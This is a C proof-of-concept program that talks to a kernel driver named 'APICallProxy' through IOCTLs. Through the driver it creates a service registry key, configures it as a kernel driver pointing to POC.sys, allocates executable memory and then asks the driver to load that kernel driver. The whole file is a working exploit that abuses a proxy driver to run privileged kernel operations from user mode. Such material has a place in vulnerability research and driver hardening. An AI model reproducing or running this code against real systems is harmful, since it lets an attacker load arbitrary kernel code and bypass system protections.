#include <stdio.h>
//#include <Windows.h>

#include <winsock2.h>
#include <Ws2tcpip.h>

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")



#include "../APICallProxy/IOCTLCodes.h"
#include "../APICallProxy/CommonStruct.h"

typedef enum _KEY_VALUE_INFORMATION_CLASS {
	KeyValueBasicInformation,
	KeyValueFullInformation,
	KeyValuePartialInformation,
	KeyValueFullInformationAlign64,
	KeyValuePartialInformationAlign64,
	KeyValueLayerInformation,
	MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _KEY_VALUE_FULL_INFORMATION {
	ULONG   TitleIndex;
	ULONG   Type;
	ULONG   DataOffset;
	ULONG   DataLength;
	ULONG   NameLength;
	WCHAR   Name[1];            // Variable size
//          Data[1];            // Variable size data not declared
} KEY_VALUE_FULL_INFORMATION, * PKEY_VALUE_FULL_INFORMATION;



int main(int argc, WCHAR* argv[])
{

	BOOL Status = 1;
	DWORD returned;
	HANDLE POCKeyHandle = NULL;
	RegistrySetValueInfo SetValueInfo = { 0 };
	OpenCreateRegistryInfo Reginfo = { 0 };
	WCHAR RegPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\POC";

	HANDLE hDevice = CreateFile(L"\\\\.\\APICallProxy", GENERIC_WRITE, FILE_SHARE_WRITE, FALSE, OPEN_EXISTING, 0, FALSE);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("[-] Failed To Open Driver Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	wcscpy(Reginfo.RegistryKeyPath, RegPath);
	Reginfo.DesiredAccess = KEY_ALL_ACCESS;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CREATE_REGISTRY_KEY, &Reginfo, sizeof(OpenCreateRegistryInfo), &POCKeyHandle, sizeof(HANDLE), &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Create POC Registry Service Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Created POC Registry Service Successfully\n");

	DWORD StartValue[] = { SERVICE_DEMAND_START };
	wcscpy(SetValueInfo.KeyName, L"Start");
	SetValueInfo.Date = StartValue;
	SetValueInfo.DateSize = 4; //DWORD Size
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_DWORD;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set Start Value to SERVICE_DEMAND_START Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting Start Value to SERVICE_DEMAND_START Successfully\n");

	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
	DWORD TypeValue[] = { SERVICE_KERNEL_DRIVER };
	wcscpy(SetValueInfo.KeyName, L"Type");
	SetValueInfo.Date = TypeValue;
	SetValueInfo.DateSize = 4;	//DWORD Size
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_DWORD;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set Type Value to SERVICE_KERNEL_DRIVER Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting Type Value to SERVICE_KERNEL_DRIVER Successfully\n");

	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
	DWORD ErrorControlValue[] = { SERVICE_ERROR_NORMAL };
	wcscpy(SetValueInfo.KeyName, L"ErrorControl");
	SetValueInfo.Date = ErrorControlValue;
	SetValueInfo.DateSize = 4;	//DWORD Size
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_DWORD;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set ErrorControl Value to SERVICE_ERROR_NORMAL Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting ErrorControl Value to SERVICE_ERROR_NORMAL Successfully\n");


	memset(&SetValueInfo, 0x00, sizeof(RegistrySetValueInfo));
	WCHAR BinPath[] = L"POC.sys";	//Change to image Full Path (\??\\c:\\Users\\UserName\\Desktop\\POC.sys)
	wcscpy(SetValueInfo.KeyName, L"ImagePath");
	SetValueInfo.Date = BinPath;
	SetValueInfo.DateSize = wcslen(BinPath) * 2 + 2;
	SetValueInfo.KeyHandle = POCKeyHandle;
	SetValueInfo.Type = REG_SZ;

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_SET_KEY, &SetValueInfo, sizeof(RegistrySetValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To set ImagePath Value Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Setting ImagePath Value Successfully\n");


	// Get Needed Memory Size
	RegistryQueryKeyValueInfo QueryKeyValueInfo = { 0 };
	QueryKeyValueInfo.KeyHandle = POCKeyHandle;
	wcscpy(QueryKeyValueInfo.ValueName, L"ImagePath");
	QueryKeyValueInfo.KeyValueInformationClass = KeyValueFullInformation;
	QueryKeyValueInfo.Data = NULL;
	QueryKeyValueInfo.DateSize = 0;
	ULONG ReturnSize = 0;
	QueryKeyValueInfo.ResultLength = &ReturnSize;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_QUERY_KEY_VALUE, &QueryKeyValueInfo, sizeof(RegistryQueryKeyValueInfo), NULL, NULL, &returned, FALSE);

	//Allocate memory for ImagePath
	AllocateVirtualMeomryInfo Allocate = { 0 };
	Allocate.BaseAddress = NULL;
	Allocate.RegionSize = ReturnSize;
	Allocate.ProcessHandle = GetCurrentProcess();
	Allocate.Protect = PAGE_EXECUTE_READWRITE;
	Allocate.AllocationType = MEM_RESERVE | MEM_COMMIT;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_ALLOCATE_MEMORY_IN_PROCESS_USING_HANDLE, &Allocate, sizeof(AllocateVirtualMeomryInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Allocate Memory in Current Process Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Allocated Memory Successfully\n");

	//Query the ImagePath Key Value
	QueryKeyValueInfo.Data = Allocate.BaseAddress;
	QueryKeyValueInfo.DateSize = ReturnSize;
	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_REGISTRY_QUERY_KEY_VALUE, &QueryKeyValueInfo, sizeof(RegistryQueryKeyValueInfo), NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed to Query Key Value for ImagePath Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Query Key Value Successfully\n");

	PKEY_VALUE_FULL_INFORMATION keyInfo = (PKEY_VALUE_FULL_INFORMATION)Allocate.BaseAddress;

	if (keyInfo->Type != REG_SZ) {
		printf("[-] Error: The ImagePath should be REG_SZ Key\n");
	}
	else {
		printf("[+] The ImagePath Path value is %S\n", ((UCHAR*)Allocate.BaseAddress + keyInfo->DataOffset));
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_LOAD_DRIVER, RegPath, wcslen(RegPath) * 2 + 2, NULL, NULL, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Load Driver Error Code: 0x%x\n", GetLastError());
	}
	else {
		printf("[+] Driver Loaded Successfully\n");
	}

	Status = DeviceIoControl(hDevice, IOCTL_API_PROXY_CLOSE_HANDLE, &POCKeyHandle, sizeof(HANDLE), FALSE, 0, &returned, FALSE);
	if (!Status) {
		printf("[-] Failed To Close Handle to Registry Key Error Code: 0x%x\n", GetLastError());
		return 0;
	}

	printf("[+] Closed Handle to Registry Key Successfully\n");


	return 0;
}